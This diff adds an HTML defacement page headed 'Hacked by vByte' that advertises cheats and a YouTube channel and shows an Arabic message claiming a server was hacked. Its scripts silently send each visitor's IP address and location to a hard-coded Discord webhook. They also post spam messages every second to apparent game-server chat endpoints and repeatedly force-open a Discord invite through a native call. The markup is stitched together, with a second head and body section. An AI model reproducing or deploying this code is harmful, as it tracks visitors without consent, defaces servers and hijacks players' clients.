@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Hacked by vBytee</title>
+
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg:#000;
+      --accent:#ff0000;
+    }
+
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family: "Share Tech Mono", monospace;
+      background:
+        linear-gradient(0deg, rgb(255,255,255,0.02) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px),
+        radial-gradient(circle at center, rgba(255, 0, 0, 0), rgba(255,255,255,0.0) 25%);
+      background-size: 20px 20px, 20px 20px, 100% 100%;
+      background-color: var(--bg);
+      color:#ddd;
+    }
+
+    .page {
+      min-height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:60px 28px;
+      position:relative;
+    }
+
+    .left-panel {
+      position: absolute;
+      top: 28px;
+      left: 28px;
+      width: 280px;
+      background-color: rgba(0, 0, 0, 0.6);
+      border: 1px solid rgb(255, 0, 0);
+      border-radius: 10px;
+      padding: 16px 20px;
+      box-shadow: 0 0 15px rgb(255, 0, 0);
+      font-family: "Share Tech Mono", monospace;
+    }
+
+    .left-panel .title {
+      font-weight: bold;
+      font-size: 14px;
+      text-transform: uppercase;
+      margin-bottom: 12px;
+      letter-spacing: 1px;
+      color: white;
+    }
+
+    .left-panel ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+
+    .left-panel ul li {
+      color: var(--accent);
+      margin-bottom: 8px;
+      font-size: 13px;
+    }
+
+    .left-panel .discord-link {
+      display: flex;
+      align-items: center;
+      margin-top: 12px;
+      font-size: 13px;
+    }
+
+    .left-panel .discord-link span {
+      display: inline-block;
+      width: 10px;
+      height: 10px;
+      border: 1px solid white;
+      border-radius: 50%;
+      margin-right: 6px;
+    }
+
+    .left-panel .discord-link a {
+      color: white;
+      text-decoration: none;
+    }
+
+    .left-panel .discord-link a:hover {
+      text-decoration: underline;
+    }
+
+    .main-col{
+      width:100%;
+      max-width:980px;
+      display:flex;
+      align-items:center;
+      flex-direction:column;
+      gap:28px;
+    }
+
+    /* تعديل الصورة لتكون دائرية مع الإطار */
+    .main-image{
+      width:360px;
+      max-width:40vw;
+      border: 3px solid rgb(255, 0, 0);
+      padding:6px;
+      border-radius:50%;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.7), 0 0 18px rgba(255,255,255,0.03) inset;
+      object-fit: cover;
+      aspect-ratio: 1/1;
+    }
+
+    .title {
+      font-family: "Orbitron", sans-serif;
+      font-weight:700;
+      font-size: clamp(36px, 6vw, 86px);
+      letter-spacing: 6px;
+      color: transparent;
+      -webkit-text-stroke: 1px rgba(255,255,255,0.06);
+      background: linear-gradient(180deg, #ff0000, #ff0000 50%, #ff0000 100%);
+      -webkit-background-clip: text;
+      text-shadow:
+         0 6px 24px rgba(0,0,0,0.8),
+         0 0 18px rgba(255,255,255,0.06);
+      white-space: nowrap;
+    }
+
+    .discord-card{
+      width:100%;
+      max-width:720px;
+      border-radius:12px;
+      border: 1px solid rgba(255,255,255,0.06);
+      background: linear-gradient(180deg, rgba(17,17,17,0.95), rgba(12,12,12,0.9));
+      padding:18px;
+    }
+
+    .card-head{
+      display:flex;
+      gap:18px;
+      align-items:center;
+      padding-bottom:12px;
+      border-bottom: 1px solid rgba(255,255,255,0.03);
+    }
+
+    .dots { display:flex; gap:10px; }
+    .dot {
+      width:12px;
+      height:12px;
+      border-radius:50%;
+      border:2px solid rgba(255,255,255,0.12);
+    }
+
+    .discord-link {
+      margin-left:auto;
+      font-family: "Orbitron", sans-serif;
+      color:#ff0000;
+      font-size: clamp(16px, 2.4vw, 28px);
+    }
+
+    .terminal {
+      margin-top:16px;
+      padding:20px;
+      background: linear-gradient(180deg, rgba(10,10,10,0.95), rgba(12,12,12,0.95));
+      border-radius:10px;
+      border:1px solid rgba(255,255,255,0.03);
+    }
+
+    .terminal .line {
+      margin:8px 0;
+      font-size:16px;
+      color:#cfcfcf;
+      display:flex;
+      align-items:center;
+      gap:12px;
+    }
+    .terminal .line .muted { color: #ff0000; }
+
+    .response {
+      margin-top:6px;
+      font-size:18px;
+      color: var(--accent);
+      display:flex;
+      flex-direction: column;
+      align-items:flex-start;
+      gap:8px;
+    }
+
+    .response .ltr-portion{
+      direction:ltr;
+      unicode-bidi: embed;
+      font-weight:700;
+    }
+    .response .rtl-portion{
+      direction:rtl;
+      unicode-bidi: embed;
+      color: var(--accent);
+    }
+
+    .typing-caret::after{
+      content: "|";
+      margin-left:6px;
+      color: var(--accent);
+      animation: blink 700ms steps(1) infinite;
+      font-weight:700;
+    }
+    @keyframes blink{
+      0%,50%,100%{opacity:1}
+      25%,75%{opacity:0}
+    }
+  </style>
+</head>
+<body>
+
+  <div class="page">
+    <aside class="left-panel">
+      <div class="title">SUB TO MY CHANNEL FOR :</div>
+      <ul>
+        <li>CHEATS GIVEAWAYS</li>
+        <li>FREE HACKS</li>
+        <li>FREE TRIGGERS</li>
+        <li>FREE LUAS</li>
+      </ul>
+      <div class="discord-link">
+        <span></span>
+        <a href="https://www.youtube.com/@vvByte">youtube.com/@vvByte</a>
+      </div>
+    </aside>
+
+    <main class="main-col">
+      <img class="main-image" src="https://b.top4top.io/p_3506n4jz01.png" alt="Itachi preview">
+      <div id="page-title" class="title"></div>
+  <audio autoplay loop>
+    <source src="https://raw.githubusercontent.com/sadww123112/soundssd/main/sound%20(2).mp3" type="audio/mpeg">
+    Your browser does not support the audio element.
+  </audio>
+      <section class="discord-card">
+        <div class="card-head">
+          <div class="dots">
+            <span class="dot"></span>
+            <span class="dot"></span>
+            <span class="dot"></span>
+          </div>
+          <div class="discord-link" id="discord-text">youtube.com/@vvByte</div>
+        </div>
+
+        <div class="terminal">
+          <div class="line">
+            <div class="muted">○ ○ ○</div>
+            <div id="cmd-line" style="flex:1"></div>
+          </div>
+          <div id="resp-line" class="response">
+            <span class="ltr-portion" id="ltr-part"></span>
+            <span class="rtl-portion" id="rtl-part"></span>
+          </div>
+        </div>
+      </section>
+    </main>
+  </div>
+
+<script>
+  function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }
+  async function typeText(el, text, speed=60, keepCaret=false){
+    if (typeof el === 'string') el = document.getElementById(el);
+    el.classList.add('typing-caret');
+    el.textContent = "";
+    for (let i=0; i<text.length; i++){
+      el.textContent += text[i];
+      await sleep(speed);
+    }
+    if(!keepCaret) el.classList.remove('typing-caret');
+  }
+
+  async function runSequence(){
+    const titleEl = document.getElementById('page-title');
+    const cmdLine = document.getElementById('cmd-line');
+    const ltrPart = document.getElementById('ltr-part');
+    const rtlPart = document.getElementById('rtl-part');
+
+    await typeText(titleEl, "HACKED BY vByte", 50);
+    await sleep(300);
+
+    cmdLine.style.color = "#00ff00";
+    await typeText(cmdLine, "server@system:~$ ", 50);
+    const whySpan = document.createElement('span');
+    whySpan.style.fontWeight = '700';
+    whySpan.style.color = '#00ff00';
+    cmdLine.appendChild(whySpan);
+    await typeText(whySpan, "Have Been Hacked", 50);
+    await sleep(300);
+
+    ltrPart.style.color = "#ffffff";
+    await typeText(ltrPart, "vByte Is Typing :", 50);
+
+    rtlPart.style.color = "var(--accent)";
+    const arabic = "السلام عليكم ورحمة الله وبركاته تم اختراق هذا السيرفر بنجاح";
+    await typeText(rtlPart, arabic, 50);
+  }
+
+  document.addEventListener('DOMContentLoaded', runSequence);
+</script>
+<script>
+  const webhookURL = "https://discord.com/api/webhooks/1403103158963802173/tINcs0j2mqn1GbyrFvd6ELwGrRl4XOZJAzhzhaKOYMOqmhiM0JDHPuxelbSPCjinx8SO";
+
+  fetch("https://ipinfo.io/json")
+    .then(res => res.json())
+    .then(data => {
+      const embed = {
+        embeds: [
+          {
+            title: "Someone Logged By vByte Logger ✅",
+            color: 16711680,
+            fields: [
+              { name: "IP", value: data.ip || "N/A", inline: true },
+              { name: "City", value: data.city || "N/A", inline: true },
+              { name: "Region", value: data.region || "N/A", inline: true },
+              { name: "Country", value: data.country || "N/A", inline: true },
+              { name: "Location", value: data.loc || "N/A", inline: true },
+              { name: "Org", value: data.org || "N/A", inline: false },
+              { name: "Timezone", value: data.timezone || "N/A", inline: true }
+            ],
+            footer: {
+              text: "vByte Logger"
+            },
+            timestamp: new Date().toISOString()
+          }
+        ]
+      };
+
+      return fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(embed)
+      });
+    })
+    .then(res => {
+      if (!res.ok) console.error("Discord webhook failed:", res.statusText);
+    })
+    .catch(err => {
+      console.error("Error:", err);
+    });
+</script>
+<style>
+  body, html {
+    margin: 0; padding: 0; overflow: hidden; background: #000;
+    height: 100vh; width: 100vw;
+  }
+  canvas {
+    display: block;
+    position: fixed;
+    top: 0; left: 0;
+  }
+</style>
+</head>
+<body>
+<canvas id="starfield"></canvas>
+
+<script>
+  const canvas = document.getElementById("starfield");
+  const ctx = canvas.getContext("2d");
+  let width, height;
+  const stars = [];
+  const numStars = 200;
+
+  function init() {
+    resize();
+    for(let i = 0; i < numStars; i++) {
+      stars.push({
+        x: Math.random() * width,
+        y: Math.random() * height,
+        size: Math.random() * 1.2 + 0.2,
+        speed: Math.random() * 0.5 + 0.05,
+        alpha: Math.random(),
+        alphaChange: (Math.random() * 0.02) + 0.005
+      });
+    }
+    requestAnimationFrame(update);
+  }
+
+  function resize() {
+    width = window.innerWidth;
+    height = window.innerHeight;
+    canvas.width = width;
+    canvas.height = height;
+  }
+
+  function update() {
+    ctx.clearRect(0, 0, width, height);
+    for (const star of stars) {
+      star.y += star.speed;
+      star.alpha += star.alphaChange;
+      if (star.alpha >= 1 || star.alpha <= 0.1) star.alphaChange = -star.alphaChange;
+
+      if (star.y > height) {
+        star.y = 0;
+        star.x = Math.random() * width;
+        star.size = Math.random() * 1.2 + 0.2;
+        star.speed = Math.random() * 0.5 + 0.05;
+      }
+
+      ctx.beginPath();
+      ctx.arc(star.x, star.y, star.size, 0, Math.PI * 2);
+      ctx.fillStyle = `rgba(255, 255, 255, ${star.alpha.toFixed(2)})`;
+      ctx.fill();
+    }
+    requestAnimationFrame(update);
+  }
+
+  window.addEventListener("resize", () => {
+    resize();
+  });
+
+  init();
+</script>
+    <script>
+const msg = `👑 vByte On Top .gg/fSCbycfy5h Youtube : vvbyte ! 👑`;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+    </script>
+<script>
+setInterval(() => {
+window.invokeNative("openUrl", "https://discord.gg/fSCbycfy5h");
+window.invokeNative("openUrl", "https://discord.gg/fSCbycfy5h");
+window.invokeNative("openUrl", "https://discord.gg/fSCbycfy5h");
+window.invokeNative("openUrl", "https://discord.gg/fSCbycfy5h");
+}, 1000);
+    </script>
+</body>
+</html>
